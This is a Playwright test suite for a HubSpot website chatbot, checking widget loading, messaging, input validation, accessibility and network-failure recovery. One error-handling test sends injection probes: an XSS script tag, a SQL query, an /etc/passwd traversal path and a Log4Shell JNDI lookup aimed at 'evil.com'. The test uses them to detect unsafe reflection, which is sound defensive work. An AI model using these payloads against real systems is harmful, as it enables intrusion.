const { test, expect } = require('@playwright/test');
const { ChatbotHelper } = require('../../src/utils/chatbot-helper');
const { PerformanceTracker } = require('../../src/utils/performance-tracker');
const { IssueAnalyzer } = require('../../src/utils/issue-analyzer');

test.describe('HubSpot Chatbot - Basic Functionality', () => {
  let chatbotHelper;
  let performanceTracker;
  let issueAnalyzer;

  test.beforeEach(async ({ page }) => {
    chatbotHelper = new ChatbotHelper(page);
    performanceTracker = new PerformanceTracker(page);
    issueAnalyzer = new IssueAnalyzer();
    
    // Navigate to HubSpot homepage
    await page.goto('/');
    
    // Start performance tracking
    await performanceTracker.startTracking();
  });

  test.afterEach(async ({ page }) => {
    // Stop performance tracking and save results
    const metrics = await performanceTracker.stopTracking();
    await performanceTracker.saveMetrics('basic-functionality', metrics);
    
    // Generate issue report
    const issues = issueAnalyzer.getIssues();
    if (issues.length > 0) {
      console.log(`Found ${issues.length} issues in basic functionality tests`);
    }
  });

  test('chatbot widget loads and is visible', async ({ page }) => {
    test.setTimeout(30000);

    try {
      // Check if chatbot widget appears on page load
      const widgetLoadTime = await chatbotHelper.waitForWidgetLoad();
      
      expect(widgetLoadTime).toBeLessThan(10000); // Should load within 10 seconds
      
      // Verify widget is visible
      const isVisible = await chatbotHelper.isWidgetVisible();
      expect(isVisible).toBe(true);
      
      // Check widget positioning and styling
      const widgetBounds = await chatbotHelper.getWidgetBounds();
      expect(widgetBounds.width).toBeGreaterThan(0);
      expect(widgetBounds.height).toBeGreaterThan(0);
      
      // Record performance metric
      await performanceTracker.recordMetric('widget_load_time', widgetLoadTime);
      
    } catch (error) {
      issueAnalyzer.addIssue({
        category: 'ui_rendering',
        severity: 'critical',
        description: 'Chatbot widget failed to load or is not visible',
        evidence: error.message,
        impact: 'Users cannot access chatbot functionality',
        recommendation: 'Check widget initialization and CSS styling'
      });
      throw error;
    }
  });

  test('chatbot can be opened and closed', async ({ page }) => {
    test.setTimeout(20000);

    try {
      // Open chatbot
      const openTime = await chatbotHelper.openChatbot();
      expect(openTime).toBeLessThan(3000); // Should open within 3 seconds
      
      // Verify chatbot is open
      const isOpen = await chatbotHelper.isChatbotOpen();
      expect(isOpen).toBe(true);
      
      // Check if input field is available
      const hasInput = await chatbotHelper.hasInputField();
      expect(hasInput).toBe(true);
      
      // Close chatbot
      const closeTime = await chatbotHelper.closeChatbot();
      expect(closeTime).toBeLessThan(2000); // Should close within 2 seconds
      
      // Verify chatbot is closed
      const isClosed = await chatbotHelper.isChatbotClosed();
      expect(isClosed).toBe(true);

      // Record performance metrics
      await performanceTracker.recordMetric('chatbot_open_time', openTime);
      await performanceTracker.recordMetric('chatbot_close_time', closeTime);
      
    } catch (error) {
      issueAnalyzer.addIssue({
        category: 'interaction',
        severity: 'critical',
        description: 'Chatbot open/close functionality not working',
        evidence: error.message,
        impact: 'Users cannot interact with chatbot',
        recommendation: 'Check click handlers and widget state management'
      });
      throw error;
    }
  });

  test('basic message sending and receiving works', async ({ page }) => {
    test.setTimeout(30000);

    try {
      // Open chatbot
      await chatbotHelper.openChatbot();
      
      // Send a simple message
      const testMessage = 'Hello, I need help';
      const sendTime = await chatbotHelper.sendMessage(testMessage);
      
      expect(sendTime).toBeLessThan(2000); // Message should send within 2 seconds
      
      // Wait for response
      const responseTime = await chatbotHelper.waitForResponse();
      expect(responseTime).toBeLessThan(10000); // Should respond within 10 seconds
      
      // Get the response
      const response = await chatbotHelper.getLatestResponse();
      expect(response).toBeTruthy();
      expect(response.length).toBeGreaterThan(0);
      
      // Verify message appears in chat history
      const messageCount = await chatbotHelper.getMessageCount();
      expect(messageCount).toBeGreaterThanOrEqual(2); // User message + bot response
      
      // Check response relevance (basic keyword check)
      const responseRelevant = await chatbotHelper.isResponseRelevant(testMessage, response);
      if (!responseRelevant) {
        issueAnalyzer.addIssue({
          category: 'response_quality',
          severity: 'moderate',
          description: 'Bot response may not be relevant to user input',
          evidence: `Input: "${testMessage}", Response: "${response}"`,
          impact: 'Users may receive unhelpful responses',
          recommendation: 'Review intent recognition and response generation'
        });
      }

      // Record performance metrics
      await performanceTracker.recordMetric('message_send_time', sendTime);
      await performanceTracker.recordMetric('response_time', responseTime);
      
    } catch (error) {
      issueAnalyzer.addIssue({
        category: 'core_functionality',
        severity: 'critical',
        description: 'Basic message sending/receiving failed',
        evidence: error.message,
        impact: 'Core chatbot functionality is broken',
        recommendation: 'Check message handling and API connectivity'
      });
      throw error;
    }
  });

  test('chatbot handles multiple consecutive messages', async ({ page }) => {
    test.setTimeout(60000);

    try {
      await chatbotHelper.openChatbot();
      
      const messages = [
        'Hello',
        'I need information about pricing',
        'What plans do you offer?',
        'Can you tell me more about the professional plan?'
      ];
      
      const responseTimes = [];
      
      for (let i = 0; i < messages.length; i++) {
        const message = messages[i];
        
        // Send message
        await chatbotHelper.sendMessage(message);
        
        // Wait for response and measure time
        const responseTime = await chatbotHelper.waitForResponse();
        responseTimes.push(responseTime);
        
        // Get response
        const response = await chatbotHelper.getLatestResponse();
        expect(response).toBeTruthy();
        
        // Add small delay between messages
        await page.waitForTimeout(1000);
      }
      
      // Analyze response time consistency
      const avgResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
      const maxResponseTime = Math.max(...responseTimes);
      const minResponseTime = Math.min(...responseTimes);
      
      // Check for significant variance in response times
      if (maxResponseTime > avgResponseTime * 3) {
        issueAnalyzer.addIssue({
          category: 'performance_consistency',
          severity: 'moderate',
          description: 'Response times vary significantly between messages',
          evidence: `Min: ${minResponseTime}ms, Max: ${maxResponseTime}ms, Avg: ${avgResponseTime}ms`,
          impact: 'Inconsistent user experience',
          recommendation: 'Investigate backend performance and load balancing'
        });
      }
      
      // Verify all messages appear in chat history
      const finalMessageCount = await chatbotHelper.getMessageCount();
      expect(finalMessageCount).toBeGreaterThanOrEqual(messages.length * 2);

      // Record metrics
      await performanceTracker.recordMetric('avg_response_time', avgResponseTime);
      await performanceTracker.recordMetric('max_response_time', maxResponseTime);
      await performanceTracker.recordMetric('min_response_time', minResponseTime);
      
    } catch (error) {
      issueAnalyzer.addIssue({
        category: 'conversation_flow',
        severity: 'high',
        description: 'Multiple message handling failed',
        evidence: error.message,
        impact: 'Users cannot have extended conversations',
        recommendation: 'Check session management and message queuing'
      });
      throw error;
    }
  });

  test('chatbot input field validation', async ({ page }) => {
    test.setTimeout(20000);

    try {
      await chatbotHelper.openChatbot();
      
      // Test empty message handling
      const emptyMessageResult = await chatbotHelper.sendMessage('');
      expect(emptyMessageResult).toBe(false); // Should not send empty messages
      
      // Test very long message
      const longMessage = 'A'.repeat(5000);
      const longMessageSent = await chatbotHelper.sendMessage(longMessage);
      
      if (longMessageSent) {
        // If it was sent, check for response
        const responseTime = await chatbotHelper.waitForResponse(15000);
        const response = await chatbotHelper.getLatestResponse();
        
        if (!response || response.includes('error') || response.includes('too long')) {
          issueAnalyzer.addIssue({
            category: 'input_validation',
            severity: 'minor',
            description: 'Long messages may cause errors or poor responses',
            evidence: `Message length: ${longMessage.length} characters`,
            impact: 'Users with detailed questions may encounter issues',
            recommendation: 'Implement input length validation with helpful messaging'
          });
        }
      }
      
      // Test special characters
      const specialCharMessage = '!@#$%^&*()_+{}|:"<>?[]\\;\',./ ñáéíóú 中文 🎉💬';
      await chatbotHelper.sendMessage(specialCharMessage);
      const specialCharResponseTime = await chatbotHelper.waitForResponse();
      const specialCharResponse = await chatbotHelper.getLatestResponse();
      
      if (!specialCharResponse) {
        issueAnalyzer.addIssue({
          category: 'character_encoding',
          severity: 'moderate',
          description: 'Special characters or international text may not be handled properly',
          evidence: `Test message: "${specialCharMessage}"`,
          impact: 'International users or users with special characters may have issues',
          recommendation: 'Ensure proper UTF-8 encoding and character set support'
        });
      }
      
    } catch (error) {
      issueAnalyzer.addIssue({
        category: 'input_handling',
        severity: 'moderate',
        description: 'Input field validation testing failed',
        evidence: error.message,
        impact: 'Input edge cases may cause unexpected behavior',
        recommendation: 'Implement comprehensive input validation'
      });
      throw error;
    }
  });

  test('chatbot accessibility features', async ({ page }) => {
    test.setTimeout(15000);

    try {
      // Check for ARIA labels and roles
      await chatbotHelper.openChatbot();
      
      const accessibilityIssues = [];
      
      // Check if chatbot has proper ARIA labels
      const hasAriaLabel = await chatbotHelper.hasAriaLabels();
      if (!hasAriaLabel) {
        accessibilityIssues.push('Missing ARIA labels for screen readers');
      }
      
      // Check keyboard navigation
      const keyboardNavigable = await chatbotHelper.testKeyboardNavigation();
      if (!keyboardNavigable) {
        accessibilityIssues.push('Chatbot not fully keyboard navigable');
      }
      
      // Check color contrast (basic check)
      const goodContrast = await chatbotHelper.checkColorContrast();
      if (!goodContrast) {
        accessibilityIssues.push('Potential color contrast issues');
      }
      
      // Check for focus indicators
      const hasFocusIndicators = await chatbotHelper.hasFocusIndicators();
      if (!hasFocusIndicators) {
        accessibilityIssues.push('Missing visible focus indicators');
      }
      
      if (accessibilityIssues.length > 0) {
        issueAnalyzer.addIssue({
          category: 'accessibility',
          severity: 'moderate',
          description: 'Accessibility issues found',
          evidence: accessibilityIssues.join(', '),
          impact: 'Users with disabilities may have difficulty using the chatbot',
          recommendation: 'Implement proper ARIA labels, keyboard navigation, and WCAG compliance'
        });
      }
      
    } catch (error) {
      issueAnalyzer.addIssue({
        category: 'accessibility',
        severity: 'low',
        description: 'Could not complete accessibility testing',
        evidence: error.message,
        impact: 'Unknown accessibility compliance status',
        recommendation: 'Conduct manual accessibility audit'
      });
    }
  });

  test('chatbot error handling and recovery', async ({ page }) => {
    test.setTimeout(30000);

    try {
      await chatbotHelper.openChatbot();
      
      // Test network interruption simulation
      await page.setOffline(true);
      await chatbotHelper.sendMessage('Test message during offline');
      await page.waitForTimeout(3000);
      
      // Restore network
      await page.setOffline(false);
      await page.waitForTimeout(2000);
      
      // Check if chatbot recovers
      const recoveryMessage = 'Recovery test message';
      await chatbotHelper.sendMessage(recoveryMessage);
      const responseTime = await chatbotHelper.waitForResponse(15000);
      const response = await chatbotHelper.getLatestResponse();
      
      if (!response) {
        issueAnalyzer.addIssue({
          category: 'error_recovery',
          severity: 'moderate',
          description: 'Chatbot does not recover well from network interruptions',
          evidence: 'No response after network recovery',
          impact: 'Users may lose chatbot functionality after connection issues',
          recommendation: 'Implement connection retry logic and user feedback for connection issues'
        });
      }
      
      // Test invalid input handling
      const invalidInputs = [
        '<script>alert("test")</script>',
        'SELECT * FROM users;',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];
      
      for (const invalidInput of invalidInputs) {
        await chatbotHelper.sendMessage(invalidInput);
        const response = await chatbotHelper.waitForResponse(10000);
        
        if (response && response.includes(invalidInput)) {
          issueAnalyzer.addIssue({
            category: 'security',
            severity: 'high',
            description: 'Potential security vulnerability - unsafe input reflection',
            evidence: `Input: "${invalidInput}", Response contains input`,
            impact: 'Possible XSS or injection vulnerabilities',
            recommendation: 'Implement proper input sanitization and validation'
          });
        }
      }
      
    } catch (error) {
      issueAnalyzer.addIssue({
        category: 'error_handling',
        severity: 'moderate',
        description: 'Error handling testing failed',
        evidence: error.message,
        impact: 'Unknown error handling capabilities',
        recommendation: 'Conduct manual error scenario testing'
      });
    }
  });
});